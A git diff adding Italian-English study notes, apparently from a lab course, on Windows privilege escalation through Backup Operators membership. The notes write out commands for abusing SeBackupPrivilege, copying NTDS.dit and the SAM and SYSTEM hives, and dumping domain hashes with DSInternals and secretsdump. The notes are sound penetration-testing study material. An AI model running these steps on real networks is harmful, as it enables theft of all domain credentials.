@@ -304,3 +304,74 @@ c:\inetpub\wwwwroot\web.config
 %WINDIR%\system32\config\system.sav
 ```
 We may also come across .kdbx KeePass database files, OneNote notebooks, files such as passwords.*, pass.*, creds.*, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.
+
+
+# Windows Built-in groups
+
+I server windows e i Domain Controller hanno parecchi gruppi built-int di default, Vengono tutti da windows server 2008 tranne Hyper-V Administrators che e' stato aggiunto dopo.
+
+- Backup Operators
+- Event Log Readers
+- DnsAdmins
+- Hyper-V Administrators
+- Print Operators
+- Server Operators
+
+## Backup Operators
+Con `whoami /groups` possiamo vedere a quali gruppi apparteniamo.
+
+Essere di questo gruppo ci da' **SeBackup** and **SeRestore** privileges.
+
+**SeBackupPrivilege** ci da' il permesso di listare i contenuti di qualsiasi cartella e possiamo pure copiare un file (non con il classico comando copy).
+we need to programmatically copy the data, making sure to specify the FILE_FLAG_BACKUP_SEMANTICS flag.
+
+C'e' questa PoC per usare SeBackupPrivilege per copiare un file: https://github.com/giuliano108/SeBackupPrivilege.
+
+Come copiare:
+```
+PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
+PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
+```
+- importare le librerie
+- Checkiamo se abbiamo i permessi SeBackupPrivilege
+- Abilitiamo SeBackupPrivilege con `PS C:\htb> Set-SeBackupPrivilege`
+- Copiamo il file con la PoC: `PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt`
+
+## Attacking a Domain Controller - Copying NTDS.dit
+Questo gruppo permette di loggarsi come Domain Controller.
+
+NTDS.dit is a very attractive target, as it contains the NTLM hashes for all user and computer objects in the domain.
+
+As the NTDS.dit file is locked by default, we can use the Windows diskshadow utility to create a shadow copy of the C drive and expose it as E drive. The NTDS.dit in this shadow copy won't be in use by the system.
+
+![image](https://github.com/user-attachments/assets/0adc0ef2-723c-4341-9ef8-c914e1534916)
+
+infine `PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit` per copiarcelo
+
+## Backing up SAM and SYSTEM Registry Hives
+The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's secretsdump.py
+
+![image](https://github.com/user-attachments/assets/b603cf27-8028-4bce-920e-b907048d4441)
+
+## Extracting Credentials from NTDS.dit
+
+With the NTDS.dit extracted, we can use a tool such as **secretsdump.py** or the **PowerShell DSInternals** module to extract all Active Directory account credentials. Let's obtain the NTLM hash for just the administrator account for the domain using DSInternals.
+
+```
+PS C:\htb> Import-Module .\DSInternals.psd1
+PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
+PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
+```
+
+oppure
+
+`j4k1dibe@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`
+E dopo vanno craccate offline con hashcat.
+
+## Robocopy
+
+Si puo' anche usare il built-in command per copiare i file in backup mode.
+
+Robocopy differs from the copy command in that instead of just copying all files, it can check the destination directory and remove files no longer in the source directory. It can also compare files before copying to save time by not copying files that have not been changed since the last copy/backup job ran.
+
+`C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit`
